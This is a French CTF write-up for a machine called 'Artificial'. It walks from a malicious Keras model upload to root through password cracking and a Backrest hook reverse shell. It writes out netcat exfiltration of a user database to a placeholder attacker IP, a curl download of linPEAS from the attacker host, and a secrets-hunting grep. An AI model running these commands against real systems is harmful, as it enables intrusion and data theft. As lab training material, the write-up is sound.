# 🧠 CTF – Artificial (Writeup)

## 🎯 Contexte

Dans ce challenge, je fais face à une application web permettant l’upload de modèles de machine learning.  
L’objectif est d’obtenir un accès initial à la machine cible, puis d’escalader mes privilèges jusqu’à obtenir un accès **root**.

Toutes les informations sensibles ont été volontairement anonymisées pour publication publique.

---

## 🔍 Reconnaissance

Je commence par identifier les services exposés sur la machine cible à l’aide d’un scan réseau :

    nmap -sC -sV -sS <IP>

Le scan révèle un service HTTP exposé ainsi qu’une interface web permettant l’upload de fichiers de type **.h5** (modèles Keras).

---

## 🚪 Accès initial – Upload de modèle malveillant

L’application accepte des modèles `.h5`.  
J’exploite cette fonctionnalité en générant un modèle malveillant contenant un payload exécuté côté serveur.

Après l’upload et le traitement du modèle par l’application, le payload est exécuté et j’obtiens un shell sur la machine distante.

Pour stabiliser le shell obtenu :

    script /dev/null -c bash

---

## 🗄️ Récupération de données sensibles

En explorant le système, je découvre une base de données au format `.db` contenant des informations utilisateurs, notamment des **hashs de mots de passe**.

J’exfiltre cette base vers ma machine avec Netcat.

Sur ma machine attaquante :

    nc -lvnp 4445 > users.db

Sur la machine cible :

    nc <IP_ATTAQUANT> 4445 < ./users.db

Une fois la base récupérée, j’identifie un utilisateur valide ainsi qu’un hash de mot de passe.

---

## 🔐 Craquage du mot de passe et accès SSH

Je soumets le hash à un outil de cracking (CrackStation / Hashcat selon le type).  
Une fois le mot de passe retrouvé en clair, je peux me connecter en SSH :

    ssh <user>@<IP>

---

## 🔎 Énumération locale

Après connexion SSH, je poursuis l’énumération locale afin d’identifier des vecteurs d’escalade de privilèges.

J’utilise **linPEAS** pour automatiser l’énumération.

Sur ma machine :

    python3 -m http.server 8000

Sur la machine cible :

    curl http://<IP_ATTAQUANT>:8000/linpeas.sh -o /tmp/linpeas.sh
    chmod +x /tmp/linpeas.sh
    /tmp/linpeas.sh

---

## 🧩 Découverte d’un service sensible (Backrest)

L’énumération révèle la présence d’un service interne nommé **Backrest**, ainsi que des fichiers de configuration associés.

Je recherche des secrets stockés localement :

    grep -RniE "passw|secret|token|apikey|aws_|restic|backrest|pgpass|credential" . 2>/dev/null | head -n 50

Je découvre dans un fichier de configuration (ex. `config.json`) :
- un compte administrateur (ex. `backrest_root`)
- un mot de passe stocké sous forme chiffrée (bcrypt)

---

## 🔓 Craquage du mot de passe Backrest

Le secret récupéré est encodé et chiffré.  
Je l’extrais et le casse à l’aide de **Hashcat** (mode bcrypt – 3200).

Une fois le mot de passe récupéré, je dispose d’identifiants valides pour Backrest.

---

## 🔁 Accès à Backrest via tunnel SSH

Le service Backrest n’est accessible que sur `localhost` de la machine cible.  
Je mets donc en place un tunnel SSH (port forwarding local) :

    ssh -L 9898:127.0.0.1:9898 <user>@<IP>

Je peux alors accéder à l’interface Backrest depuis ma machine via :

    http://localhost:9898

Je m’authentifie avec les identifiants précédemment récupérés.

---

## 🚀 Escalade de privilèges via Backrest

Backrest permet de configurer des **repositories** et des **hooks** exécutés automatiquement lors de certaines actions.

J’abuse de cette fonctionnalité en configurant un hook contenant une commande menant à l’exécution d’un reverse shell avec des privilèges élevés.

Côté attaquant :

    nc -lvnp 4444

Après déclenchement de l’action côté Backrest, le hook est exécuté et je récupère un shell **root** sur la machine cible.

---

## 🏁 Conclusion

Ce challenge met en évidence :
- les risques liés à l’upload de fichiers applicatifs mal contrôlés,
- la dangerosité des services internes exposés uniquement sur localhost,
- l’impact critique d’une mauvaise gestion des secrets,
- les risques liés aux hooks exécutés par des services privilégiés.

L’exploitation combine attaque applicative, exfiltration de données, cracking de mots de passe et escalade de privilèges jusqu’au **root**.

---

## 🧠 Compétences démontrées

- Reconnaissance réseau (Nmap)
- Exploitation d’upload applicatif
- Reverse shell et stabilisation
- Exfiltration de fichiers (Netcat)
- Craquage de mots de passe (hash / bcrypt)
- Énumération locale (linPEAS)
- Tunneling SSH (port forwarding)
- Escalade de privilèges via service interne

---

## 📌 Notes (Redacted)

Toutes les adresses IP, noms d’utilisateurs, chemins exacts, secrets et flags ont été volontairement anonymisés pour permettre une publication publique sur GitHub.
